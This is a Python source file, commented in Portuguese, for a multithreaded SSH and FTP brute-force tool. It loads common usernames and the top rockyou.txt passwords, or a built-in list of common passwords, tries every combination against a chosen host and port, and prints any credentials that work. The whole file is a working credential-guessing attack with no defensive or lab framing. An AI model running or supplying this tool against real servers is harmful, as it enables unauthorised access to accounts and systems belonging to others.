#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import paramiko
import ftplib
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import time

class SSH_FTP_Bruteforce:
    def __init__(self, target, port, service_type):
        self.target = target
        self.port = port
        self.service_type = service_type.lower()
        self.found_credentials = []
        
    def load_wordlists(self):
        """Carrega wordlists para SSH/FTP bruteforce"""
        # Usuários comuns
        users = [
            'root', 'admin', 'administrator', 'user', 'test', 
            'ubuntu', 'debian', 'centos', 'oracle', 'ftp',
            'guest', 'demo', 'pi', 'raspberry', 'operator',
            'git', 'www', 'www-data', 'nginx', 'apache',
            'postgres', 'mysql', 'oracle', 'test', 'backup'
        ]
        
        # Verifica se existe rockyou.txt
        rockyou_path = "wordlists/rockyou.txt"
        common_passwords_path = "wordlists/passwords.txt"
        
        passwords = []
        
        # Tenta carregar rockyou.txt primeiro
        if os.path.exists(rockyou_path):
            try:
                with open(rockyou_path, 'r', encoding='utf-8', errors='ignore') as f:
                    # Pega as primeiras 1000 senhas do rockyou (as mais comuns)
                    for i, line in enumerate(f):
                        if i >= 1000:
                            break
                        passwords.append(line.strip())
                print(f"[+] Carregadas {len(passwords)} senhas do rockyou.txt")
            except:
                print("[-] Erro ao ler rockyou.txt, usando senhas padrão")
                passwords = self.get_default_passwords()
        else:
            # Se não tem rockyou, usa senhas padrão
            print("[-] rockyou.txt não encontrado, usando senhas padrão")
            passwords = self.get_default_passwords()
            # Tenta criar um arquivo de senhas básico
            self.create_basic_password_file()
        
        return users, passwords
    
    def get_default_passwords(self):
        """Senhas padrão caso rockyou.txt não exista"""
        return [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'abc123', 'football', 'monkey',
            'letmein', '696969', 'shadow', 'master', '666666',
            'qwertyuiop', '123321', 'mustang', '1234567890',
            'michael', '654321', 'superman', '1qaz2wsx', '7777777',
            'fuckyou', '121212', '000000', 'qazwsx', '123qwe',
            'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm',
            'asdfgh', 'hunter', 'buster', 'soccer', 'harley',
            'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou',
            'fuckme', '2000', 'charlie', 'robert', 'thomas',
            'hockey', 'ranger', 'daniel', 'starwars', 'klaster',
            '112233', 'george', 'asshole', 'computer', 'michelle',
            'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom', '777777', 'pass',
            'fuck', 'maggie', '159753', 'aaaaaa', 'ginger',
            'princess', 'joshua', 'cheese', 'amanda', 'summer',
            'love', 'ashley', '6969', 'nicole', 'chelsea',
            'biteme', 'matthew', 'access', 'yankees', '987654321',
            'dallas', 'austin', 'thunder', 'taylor', 'matrix'
        ]
    
    def create_basic_password_file(self):
        """Cria um arquivo básico de senhas se não existir"""
        try:
            os.makedirs("wordlists", exist_ok=True)
            with open("wordlists/passwords.txt", "w") as f:
                for pwd in self.get_default_passwords():
                    f.write(pwd + "\n")
            print("[+] Arquivo wordlists/passwords.txt criado")
        except:
            print("[-] Erro ao criar arquivo de senhas")
    
    def try_ssh_login(self, username, password):
        """Tenta login SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, username=username, password=password, timeout=10)
            
            # Se conectou, credenciais estão corretas
            ssh.close()
            return True
        except:
            return False
    
    def try_ftp_login(self, username, password):
        """Tenta login FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=10)
            ftp.login(username, password)
            ftp.quit()
            return True
        except:
            return False
    
    def bruteforce_service(self, threads=5):
        """Executa bruteforce no serviço"""
        users, passwords = self.load_wordlists()
        print(f"[*] Iniciando bruteforce {self.service_type.upper()}")
        print(f"[*] Usuários: {len(users)}, Senhas: {len(passwords)}")
        print(f"[*] Total de combinações: {len(users) * len(passwords)}")
        
        credentials_tried = 0
        lock = threading.Lock()
        
        def worker(user_pass_combo):
            nonlocal credentials_tried
            username, password = user_pass_combo
            
            with lock:
                credentials_tried += 1
                if credentials_tried % 100 == 0:
                    print(f"[*] Testadas {credentials_tried} credenciais...")
            
            success = False
            if self.service_type == "ssh":
                success = self.try_ssh_login(username, password)
            elif self.service_type == "ftp":
                success = self.try_ftp_login(username, password)
            
            if success:
                with lock:
                    self.found_credentials.append((username, password))
                print(f"[+] 💥 CREDENCIAIS {self.service_type.upper()} ENCONTRADAS: {username}:{password}")
                return True
            
            return False
        
        # Gera combinações
        combinations = [(u, p) for u in users for p in passwords]
        
        print("[*] Iniciando bruteforce...")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(worker, combinations)
        
        return self.found_credentials
    
    def bruteforce(self, threads=5):
        """Interface principal do bruteforce"""
        try:
            # Testa conexão primeiro
            print(f"[*] Testando conexão com {self.target}:{self.port}...")
            sock = socket.socket()
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result != 0:
                print(f"[-] Porta {self.port} fechada ou inacessível")
                return []
            
            print(f"[+] Conexão estabelecida com {self.target}:{self.port}")
            return self.bruteforce_service(threads)
            
        except Exception as e:
            print(f"[-] Erro de conexão: {e}")
            return []
